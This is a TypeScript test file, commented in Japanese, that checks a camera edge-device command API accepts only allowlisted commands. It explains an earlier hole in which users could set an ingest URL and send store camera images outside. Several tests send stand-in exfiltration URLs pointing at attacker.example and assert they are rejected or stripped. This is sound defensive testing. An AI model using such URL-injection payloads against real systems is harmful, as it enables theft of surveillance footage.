import { beforeEach, describe, expect, it, vi } from 'vitest'

/**
 * エッジ命令の受け口が **allowlist であること** をハンドラを実際に呼んで確かめる。
 *
 * ── 何が起きていたか ────────────────────────────────────────────────────
 * 旧実装は `{ ...(body as EdgeCommand) }` とボディを丸ごと展開して
 * `pending_command` に書いていた。`EdgeCommand` には **エッジが fetch する URL**
 * を持つ種別があり（`capture_snapshot` の `ingest_url` など）、エッジはその URL を
 * そのまま送信先にする。結果、**ログイン済みで対象エッジが見えるだけのユーザが、
 * 店舗のカメラ画像を任意の外部宛先へ送り出せた**。`reboot` も同条件で通った。
 *
 * ── ここで固定したい性質 ────────────────────────────────────────────────
 * ステータスコードより **「pending_command に何が書かれたか」** が本体なので、
 * 書き込まれた命令そのものを見る。特に:
 *   ・URL を持つ種別は受理しない
 *   ・許可した種別に余計なキーを混ぜても、それが命令に載らない（zod の strip）
 */

const h = vi.hoisted(() => ({
  loggedIn:  true,
  edgeFound: true,
  updateErr: null as { message: string } | null,
  /** pending_command に書かれた命令。null = 書き込みに至らなかった */
  written:   null as Record<string, unknown> | null,
  logged:    [] as string[],
}))

vi.mock('@/lib/supabase/server', () => ({
  createSupabaseServer: async () => ({
    auth: { getUser: async () => ({ data: { user: h.loggedIn ? { id: 'u1' } : null } }) },
    from: () => ({
      select: () => ({
        eq: () => ({
          single: async () =>
            h.edgeFound
              ? { data: { id: 'e1', store_id: 's1', status: 'idle' }, error: null }
              : { data: null, error: { message: 'no rows' } },
        }),
      }),
    }),
  }),
  createSupabaseService: () => ({
    from: () => ({
      update: (row: Record<string, unknown>) => {
        h.written = row.pending_command as Record<string, unknown>
        return { eq: async () => ({ error: h.updateErr }) }
      },
    }),
  }),
}))

import { POST, USER_COMMAND_ACTIONS } from '@/app/api/edges/[id]/commands/route'
import type { NextRequest } from 'next/server'

beforeEach(() => {
  h.loggedIn = true
  h.edgeFound = true
  h.updateErr = null
  h.written = null
  h.logged = []
  vi.spyOn(console, 'error').mockImplementation((m: unknown) => { h.logged.push(String(m)) })
})

async function send(body: unknown) {
  const req = new Request('http://localhost/api/edges/e1/commands', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  }) as unknown as NextRequest
  const res = await POST(req, { params: Promise.resolve({ id: 'e1' }) })
  return { status: res.status, json: (await res.json()) as Record<string, unknown> }
}

const CAM  = '11111111-1111-4111-8111-111111111111'
const CLIP = '22222222-2222-4222-8222-222222222222'

describe('エッジ命令の allowlist', () => {
  describe('★ URL を持つ命令は受理しない（画像の持ち出し経路）', () => {
    it('capture_snapshot は 400（ingest_url を運べない）', async () => {
      const r = await send({
        action: 'capture_snapshot',
        run_id: 'r1',
        camera_ids: [CAM],
        ingest_url: 'https://attacker.example/collect',
      })
      expect(r.status).toBe(400)
      expect(h.written).toBeNull()      // 書き込みまで到達していない
    })

    it('capture_alarm_timeline は 400', async () => {
      const r = await send({
        action: 'capture_alarm_timeline',
        alarm_id: 'a1', occurred_at: '2026-08-13T00:00:00Z', offsets_sec: [0],
        ingest_url: 'https://attacker.example/collect',
      })
      expect(r.status).toBe(400)
      expect(h.written).toBeNull()
    })

    it('start_sfu は 400（whip_url を運べない）', async () => {
      const r = await send({
        action: 'start_sfu', camera_id: CAM,
        room: 'r', whip_url: 'https://attacker.example/whip',
      })
      expect(r.status).toBe(400)
      expect(h.written).toBeNull()
    })

    it('start_bcp_capture は 400（サーバ側の経路でのみ発行される）', async () => {
      const r = await send({
        action: 'start_bcp_capture', eventId: 'e', clips: [],
        clipFrom: '2026-08-13T00:00:00Z', clipTo: '2026-08-13T00:05:00Z',
      })
      expect(r.status).toBe(400)
      expect(h.written).toBeNull()
    })
  })

  it('★reboot は 400（視聴できることと機材を止められることは別）', async () => {
    const r = await send({ action: 'reboot' })
    expect(r.status).toBe(400)
    expect(h.written).toBeNull()
  })

  it('★許可した命令に混ぜた余計なキーは命令に載らない', async () => {
    // 「受理する種別なら何を混ぜても通る」形だと allowlist の意味が無い。
    const r = await send({
      action: 'start_live', camera_id: CAM,
      ingest_url: 'https://attacker.example/collect',
      whip_url:   'https://attacker.example/whip',
    })
    expect(r.status).toBe(200)
    expect(h.written).not.toBeNull()
    expect(h.written).not.toHaveProperty('ingest_url')
    expect(h.written).not.toHaveProperty('whip_url')
    expect(h.written).toMatchObject({ action: 'start_live', camera_id: CAM })
  })

  describe('UI が実際に送る 5 種は通る', () => {
    it.each(['start_grid', 'stop_grid', 'stop_stream'])('%s', async (action) => {
      const r = await send({ action })
      expect(r.status).toBe(200)
      expect(h.written).toMatchObject({ action })
      expect(h.written?.request_id).toEqual(expect.any(String))
    })

    it('start_live', async () => {
      const r = await send({ action: 'start_live', camera_id: CAM })
      expect(r.status).toBe(200)
      expect(h.written).toMatchObject({ action: 'start_live', camera_id: CAM })
    })

    it('start_vod（オフセット付きの日時も通す）', async () => {
      // /api/vod 側は Date.parse で受けている。ここだけ厳しくすると
      // 「録画が取れない」形で壊れるので、+09:00 表記も通ることを固定する。
      const r = await send({
        action: 'start_vod', camera_id: CAM, clip_id: CLIP,
        from_iso: '2026-08-13T10:00:00+09:00', to_iso: '2026-08-13T10:05:00+09:00',
      })
      expect(r.status).toBe(200)
      expect(h.written).toMatchObject({ action: 'start_vod', clip_id: CLIP })
    })
  })

  it('台帳（USER_COMMAND_ACTIONS）と実装が一致している', () => {
    // 種別を足すときに、この一覧の更新を忘れないための固定。
    expect([...USER_COMMAND_ACTIONS].sort()).toEqual(
      ['start_grid', 'start_live', 'start_vod', 'stop_grid', 'stop_stream'],
    )
  })

  describe('前段の門', () => {
    it('未ログインは 401（命令の中身を見る前に落ちる）', async () => {
      h.loggedIn = false
      const r = await send({ action: 'start_grid' })
      expect(r.status).toBe(401)
      expect(h.written).toBeNull()
    })

    it('見えないエッジは 404', async () => {
      h.edgeFound = false
      const r = await send({ action: 'start_grid' })
      expect(r.status).toBe(404)
      expect(h.written).toBeNull()
    })

    it('空ボディ・不正 JSON は 400', async () => {
      expect((await send({})).status).toBe(400)
      expect((await send({ action: 'nope' })).status).toBe(400)
      expect((await send({ action: 'start_live' })).status).toBe(400)          // camera_id 無し
      expect((await send({ action: 'start_live', camera_id: 'x' })).status).toBe(400) // uuid でない
    })
  })

  it('★DB エラーの内容を返さない（列名・スキーマ状態が漏れる）', async () => {
    h.updateErr = { message: 'column "pending_command" does not exist' }
    const r = await send({ action: 'start_grid' })
    expect(r.status).toBe(500)
    expect(JSON.stringify(r.json)).not.toContain('pending_command')
    expect(r.json.error).toBe('command_dispatch_failed')
    // 切り分けができなくなるのは困るので、ログには残っていること。
    expect(h.logged.join()).toContain('[edge-commands]')
  })

  it('不受理の理由を返さない（受理する形が読み取れてしまう）', async () => {
    const r = await send({ action: 'capture_snapshot', ingest_url: 'https://x/' })
    expect(r.json).toEqual({ error: 'invalid_command' })
  })
})
